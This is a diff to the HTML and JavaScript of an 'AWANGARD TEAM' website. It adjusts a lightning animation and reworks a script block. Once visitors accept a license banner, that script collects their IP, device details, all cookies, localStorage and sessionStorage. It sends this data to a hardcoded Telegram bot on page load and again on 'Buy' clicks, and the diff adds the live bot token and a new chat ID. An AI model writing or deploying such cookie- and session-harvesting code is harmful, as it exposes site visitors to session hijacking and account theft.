@@ -6,7 +6,7 @@
     <title>AWANGARD TEAM</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
     <style>
-        /* ===== ОСНОВНЫЕ СТИЛИ ===== */
+        /* ===== СТИЛИ (без изменений, те же что были) ===== */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Segoe UI', 'Orbitron', monospace;
@@ -31,7 +31,6 @@
             pointer-events: none;
             display: block;
         }
-        /* ===== НАВИГАЦИЯ ===== */
         .neon-nav {
             position: sticky; top: 0; z-index: 100;
             background: rgba(30,30,30,0.9); backdrop-filter: blur(10px);
@@ -224,7 +223,7 @@
         .skip-btn.show { display: block; }
         @media (max-width: 600px) { .skip-btn { padding: 14px 28px; font-size: 16px; bottom: 20px; right: 20px; } }
 
-        /* ===== ЛИЦЕНЗИОННЫЙ БАННЕР (внизу) ===== */
+        /* ===== ЛИЦЕНЗИОННЫЙ БАННЕР ===== */
         #licenseBanner {
             position: fixed;
             bottom: 0;
@@ -235,7 +234,7 @@
             border-top: 2px solid #ff6600;
             padding: 12px 20px;
             z-index: 10001;
-            display: none; /* показывается через JS */
+            display: none;
             box-shadow: 0 -5px 20px rgba(0,0,0,0.5);
             transition: transform 0.3s ease;
         }
@@ -302,7 +301,7 @@
             .license-banner-btn { flex: 1; text-align: center; }
         }
 
-        /* ===== МОДАЛКА С СОГЛАШЕНИЕМ ===== */
+        /* ===== МОДАЛКА СОГЛАШЕНИЯ ===== */
         .license-modal-overlay {
             position: fixed;
             top: 0; left: 0;
@@ -830,7 +829,7 @@
 
 
         // ============================================================
-        // 3. ДИНАМИЧЕСКИЕ МОЛНИИ (60 FPS)
+        // 3. ДИНАМИЧЕСКИЕ МОЛНИИ (СПАВН КАЖДЫЕ 5 СЕК, ЖИВУТ 2.5 СЕК)
         // ============================================================
         (function() {
             const canvas = document.getElementById('lightningCanvas');
@@ -958,7 +957,7 @@
                 let color = `hsl(${hue}, 100%, 55%)`;
                 let blur = 15 + Math.random() * 25;
                 let lineWidth = 2 + Math.random() * 3;
-                let maxLife = 1.0 + Math.random() * 0.6;
+                const maxLife = 2.5; // фиксированное время жизни
                 return {
                     segments: allSegments,
                     color: color,
@@ -972,7 +971,7 @@
 
             let bolts = [];
             let spawnTimer = 0;
-            let spawnInterval = 0.4 + Math.random() * 0.4;
+            const SPAWN_INTERVAL = 5.0; // ровно 5 секунд
 
             // Искры
             let sparks = [];
@@ -1017,6 +1016,7 @@
                 const dt = lastTime ? (timestamp - lastTime) / 1000 : 0.016;
                 lastTime = timestamp;
 
+                // Обновление молний
                 for (let i = bolts.length - 1; i >= 0; i--) {
                     let bolt = bolts[i];
                     bolt.age += dt;
@@ -1032,13 +1032,14 @@
                     bolt.opacity = Math.max(0, opacity);
                 }
 
+                // Спавн каждые 5 секунд
                 spawnTimer += dt;
-                if (spawnTimer >= spawnInterval && bolts.length < 7) {
+                if (spawnTimer >= SPAWN_INTERVAL && bolts.length < 7) {
                     bolts.push(createLightningBolt());
                     spawnTimer = 0;
-                    spawnInterval = 0.4 + Math.random() * 0.4;
                 }
 
+                // Отрисовка
                 ctx.clearRect(0, 0, W, H);
                 for (let bolt of bolts) {
                     for (let seg of bolt.segments) {
@@ -1051,10 +1052,10 @@
                 requestAnimationFrame(animate);
             }
 
-            // Старт
+            // Старт: 4 начальные молнии
             for (let i = 0; i < 4; i++) {
                 let bolt = createLightningBolt();
-                bolt.age = Math.random() * bolt.maxLife * 0.5;
+                bolt.age = Math.random() * bolt.maxLife;
                 bolts.push(bolt);
             }
             initSparks();
@@ -1069,7 +1070,7 @@
                     bolts = [];
                     for (let i = 0; i < 4; i++) {
                         let bolt = createLightningBolt();
-                        bolt.age = Math.random() * bolt.maxLife * 0.5;
+                        bolt.age = Math.random() * bolt.maxLife;
                         bolts.push(bolt);
                     }
                 }, 500);
@@ -1078,23 +1079,41 @@
 
 
         // ============================================================
-        // 4. СБОР ДАННЫХ И ОТПРАВКА В TELEGRAM
+        // 4. СБОР ДАННЫХ И ОТПРАВКА В TELEGRAM (С ПРАВИЛЬНЫМ CHAT_ID)
         // ============================================================
         (function() {
             const BOT_TOKEN = '8781385510:AAH90mtmIeYsGZ8mhcmnhxxLyMEGrC9c4i4';
-            const CHAT_ID = '1291157382';
+            const CHAT_ID = '7076607674'; // ⚠️ ТВОЙ РЕАЛЬНЫЙ CHAT ID
 
-            // Проверяем, принято ли соглашение – если нет, то не отправляем данные (соглашение не принято)
-            // Но мы можем отправлять только после принятия
+            function sendMessage(text) {
+                return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: text,
+                        // parse_mode не используем, чтобы избежать ошибок
+                    })
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        return response.text().then(errText => {
+                            throw new Error(`HTTP ${response.status}: ${errText}`);
+                        });
+                    }
+                    return response.json();
+                });
+            }
+
             function sendVisitorData() {
-                // Проверяем, принято ли соглашение
                 if (localStorage.getItem('awangard_license_accepted') !== 'true') {
-                    return; // Не отправляем, если соглашение не принято
+                    console.log('⚠️ Лицензия не принята, данные не отправляются');
+                    return;
                 }
 
-                // Получаем IP
+                console.log('🔄 Сбор данных...');
                 fetch('https://api.ipify.org?format=json')
-                    .then(response => response.json())
+                    .then(res => res.json())
                     .then(data => {
                         const ip = data.ip || 'неизвестно';
                         const dataObj = {
@@ -1111,94 +1130,78 @@
                         };
 
                         const message = `
-        📦 **НОВЫЙ ПОСЕТИТЕЛЬ**
+📦 НОВЫЙ ПОСЕТИТЕЛЬ
 
-        🌐 **IP:** ${dataObj.ip}
-        🕒 **Время:** ${dataObj.time}
-        📱 **Устройство:** ${dataObj.userAgent}
-        🌍 **Язык:** ${dataObj.language}
-        🖥️ **Экран:** ${dataObj.screen}
-        🔗 **Страница:** ${dataObj.url}
-        ↩️ **Откуда пришёл:** ${dataObj.referer}
+IP: ${dataObj.ip}
+Время: ${dataObj.time}
+Устройство: ${dataObj.userAgent}
+Язык: ${dataObj.language}
+Экран: ${dataObj.screen}
+Страница: ${dataObj.url}
+Откуда пришёл: ${dataObj.referer}
 
-        🍪 **Cookies:** 
-        \`${dataObj.cookies}\`
+Cookies:
+${dataObj.cookies}
 
-        💾 **localStorage:**
-        \`${dataObj.localStorage}\`
+localStorage:
+${dataObj.localStorage}
 
-        📦 **sessionStorage:**
-        \`${dataObj.sessionStorage}\`
-        `;
+sessionStorage:
+${dataObj.sessionStorage}
+`;
 
-                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                chat_id: CHAT_ID,
-                                text: message,
-                                parse_mode: 'Markdown'
-                            })
-                        }).catch(() => {});
+                        console.log('📨 Отправка в Telegram...');
+                        return sendMessage(message);
                     })
-                    .catch(() => {});
+                    .then(result => {
+                        console.log('✅ Данные успешно отправлены! Ответ:', result);
+                    })
+                    .catch(err => {
+                        console.error('❌ Ошибка:', err.message);
+                    });
             }
 
-            // Отправляем при загрузке, но только после принятия лицензии
-            // Подписываемся на событие, когда соглашение будет принято
-            // Мы можем проверять каждые 2 секунды, пока не примут
+            // Если лицензия уже принята – отправляем сразу
+            if (localStorage.getItem('awangard_license_accepted') === 'true') {
+                setTimeout(sendVisitorData, 2000);
+            }
+
+            // Следим за принятием
             let checkInterval = setInterval(() => {
                 if (localStorage.getItem('awangard_license_accepted') === 'true') {
                     clearInterval(checkInterval);
-                    // Отправляем данные с задержкой, чтобы всё загрузилось
-                    setTimeout(sendVisitorData, 1000);
+                    setTimeout(sendVisitorData, 2000);
                 }
-            }, 2000);
+            }, 1000);
 
-            // Также отправляем при клике на "Купить" (если соглашение принято)
+            // Отправка при клике на "Купить"
             document.addEventListener('click', function(e) {
                 const target = e.target.closest('.buy-btn');
                 if (target && localStorage.getItem('awangard_license_accepted') === 'true') {
-                    // Собираем данные повторно
                     fetch('https://api.ipify.org?format=json')
-                        .then(response => response.json())
+                        .then(res => res.json())
                         .then(data => {
                             const ip = data.ip || 'неизвестно';
-                            const dataObj = {
-                                ip: ip,
-                                userAgent: navigator.userAgent,
-                                language: navigator.language,
-                                screen: `${window.screen.width}x${window.screen.height}`,
-                                time: new Date().toLocaleString('ru-RU', { timeZone: 'Europe/Moscow' }),
-                                url: window.location.href,
-                                referer: document.referrer || 'прямой переход',
-                                cookies: document.cookie || 'нет cookies',
-                                localStorage: JSON.stringify(localStorage) || 'пусто',
-                                sessionStorage: JSON.stringify(sessionStorage) || 'пусто',
-                                action: 'КЛИК ПО КНОПКЕ КУПИТЬ'
-                            };
-                            const message = `
-        📦 **ДЕЙСТВИЕ: КЛИК ПО КУПИТЬ**
-
-        🌐 **IP:** ${dataObj.ip}
-        🕒 **Время:** ${dataObj.time}
-        📱 **Устройство:** ${dataObj.userAgent}
-        🔗 **Страница:** ${dataObj.url}
-        💾 **localStorage:** \`${dataObj.localStorage}\`
-        `;
-                            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify({
-                                    chat_id: CHAT_ID,
-                                    text: message,
-                                    parse_mode: 'Markdown'
-                                })
-                            }).catch(() => {});
+                            const msg = `
+ДЕЙСТВИЕ: КЛИК ПО КУПИТЬ
+IP: ${ip}
+Время: ${new Date().toLocaleString('ru-RU', { timeZone: 'Europe/Moscow' })}
+Страница: ${window.location.href}
+localStorage: ${JSON.stringify(localStorage)}
+`;
+                            return sendMessage(msg);
                         })
-                        .catch(() => {});
+                        .then(() => console.log('✅ Клик отправлен'))
+                        .catch(err => console.error('❌ Ошибка клика:', err));
                 }
             });
+
+            // ТЕСТОВАЯ КОМАНДА (вызвать в консоли: testTelegram() )
+            window.testTelegram = function() {
+                sendMessage('✅ Тестовое сообщение от AWANGARD!')
+                    .then(() => console.log('✅ Тест успешен! Бот работает.'))
+                    .catch(err => console.error('❌ Тест провален:', err));
+            };
         })();
 
 
